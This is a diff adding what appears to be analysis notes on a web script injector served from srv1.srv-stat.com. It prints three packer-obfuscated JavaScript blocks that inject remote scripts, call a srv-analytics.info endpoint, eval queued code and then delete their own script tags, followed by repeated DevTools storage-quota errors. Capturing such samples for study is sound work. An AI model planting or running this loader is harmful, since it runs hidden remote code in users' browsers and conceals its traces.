@@ -1,0 +1,46 @@
+-Sources:
+-http://srv1.srv-stat.com/i/?tid=837&hash=6n21ye&subid=430:
+-Evaluate in console:
+var srv_jsloadfunc_arr = [];  
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('q w(a,b,c){d(3(a)==\'4\')i 9;c=(3(c)==\'4\')?9:r;b=(3(b)==\'4\')?"5":b;p s=6.t(\'u\'),g=\'x\';s.8(\'j\',\'k/l\');s.8(\'m\',a);n(b){o:7"5":1=\'5\';2;7"e":1=\'e\';2;7"f":1=\'f\';2}d(c)(v.6[g](1)[0]).h(s);y(6[g](1)[0]).h(s)}',35,35,'|root_elem|break|typeof|undefined|body|document|case|setAttribute|false||||if|head|html||appendChild|return|type|text|javascript|src|switch|default|var|function|true||createElement|script|top|ijct|getElementsByTagName|else'.split('|'),0,{}));var dmn = 'srv1.srv-stat.com';
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4=2(a){5(\'6://7.8-9.b/i/c.d?e=\'+a);f(g i=0;i<1.h;i++){j(k 3(1[i])==="2"){3(1[i]+"()")}}};',21,21,'|srv_jsloadfunc_arr|function|eval|srv_analytics_active|ijct|http|load3|srv|analytics||info|active|php|prd|for|var|length||if|typeof'.split('|'),0,{}));
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6(8 c=a.4("5"),2=c.7-1;2>=0;--2)9(c[2].3&&c[2].3.b(d)>-1)c[2].e.f(c[2]);',16,16,'||i|src|getElementsByTagName|script|for|length|var|if|document|indexOf||dmn|parentNode|removeChild'.split('|'),0,{}))
+
+Error saving setting with name: consoleHistory, value length: 5441423. Error: Failed to set the 'consoleHistory' property on 'Storage': Setting the value of 'consoleHistory' exceeded the quota.
+Ten largest settings: 
+Setting: 'consoleHistory', size: 5234863
+Setting: 'previouslyViewedFiles', size: 4052
+Setting: 'savedURLs', size: 3514
+Setting: 'breakpoints', size: 227
+Setting: 'watchExpressions', size: 13
+Setting: 'lastSelectedSourcesSidebarPaneTab', size: 7
+Setting: 'domBreakpoints', size: 2
+Setting: 'eventListenerBreakpoints', size: 2
+Setting: 'experiments', size: 2
+Setting: 'workspaceExcludedFolders', size: 2
+undefined
+Error saving setting with name: savedURLs, value length: 3719. Error: Failed to set the 'savedURLs' property on 'Storage': Setting the value of 'savedURLs' exceeded the quota.
+Ten largest settings: 
+Setting: 'consoleHistory', size: 5234863
+Setting: 'previouslyViewedFiles', size: 4052
+Setting: 'savedURLs', size: 3514
+Setting: 'breakpoints', size: 227
+Setting: 'watchExpressions', size: 13
+Setting: 'lastSelectedSourcesSidebarPaneTab', size: 7
+Setting: 'domBreakpoints', size: 2
+Setting: 'eventListenerBreakpoints', size: 2
+Setting: 'experiments', size: 2
+Setting: 'workspaceExcludedFolders', size: 2
+Error saving setting with name: savedURLs, value length: 3760. Error: Failed to set the 'savedURLs' property on 'Storage': Setting the value of 'savedURLs' exceeded the quota.
+Ten largest settings: 
+Setting: 'consoleHistory', size: 5234863
+Setting: 'previouslyViewedFiles', size: 4052
+Setting: 'savedURLs', size: 3514
+Setting: 'breakpoints', size: 227
+Setting: 'watchExpressions', size: 13
+Setting: 'lastSelectedSourcesSidebarPaneTab', size: 7
+Setting: 'domBreakpoints', size: 2
+Setting: 'eventListenerBreakpoints', size: 2
+Setting: 'experiments', size: 2
+Setting: 'workspaceExcludedFolders', size: 2
+
